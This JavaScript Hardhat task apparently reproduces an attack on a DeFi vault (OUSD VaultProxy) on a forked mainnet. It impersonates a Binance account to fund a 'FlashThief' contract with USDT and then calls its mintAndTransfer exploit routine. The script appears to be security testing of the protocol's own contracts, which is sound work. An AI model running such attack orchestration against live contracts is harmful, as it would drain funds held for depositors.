const addresses = require("../utils/addresses");
const usdtAbi = require("../test/abi/usdt.json").abi;

async function executeAttack(taskArguments, hre) {
  const {
    usdtUnits,
    isFork,
    ousdUnits
  } = require("../test/helpers");

  if (!isFork) {
    throw new Error('Execute this task in forked environment!')
  }
  const signers = await ethers.getSigners();

  let binanceSigner, thiefSigner, usdt, vault;

  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [addresses.mainnet.Binance],
  });

  vaultProxy = await hre.ethers.getContract("VaultProxy");
  usdt = await hre.ethers.getContractAt(usdtAbi, addresses.mainnet.USDT);
  const flashThief = await hre.ethers.getContract("FlashThief");

  binanceSigner = await hre.ethers.provider.getSigner(
    addresses.mainnet.Binance
  );
  thiefSigner = await hre.ethers.provider.getSigner(
    flashThief.address
  );
  console.log("Thief located at:", flashThief.address, thiefSigner);

  const usdtToTransfer = usdtUnits("100")
  await usdt.connect(binanceSigner).transfer(flashThief.address, usdtToTransfer);
  console.log("Transfered 100 USDT to flash thief's address");


  // calling approve as thiefSigner fails with: ProviderError: unknown account [address_of_flashThief_contarct]
  // await usdt.connect(thiefSigner).approve(vaultProxy.address, usdtUnits("100"))
  // console.log("Approved vault on behalf of thief contract");

  await flashThief.connect(signers[4]).mintAndTransfer(
    addresses.mainnet.Binance,
    addresses.mainnet.USDT,
    ousdUnits("99"),
    ousdUnits("95")
  , { gasLimit: 3000000 });
}

module.exports = {
  executeAttack
}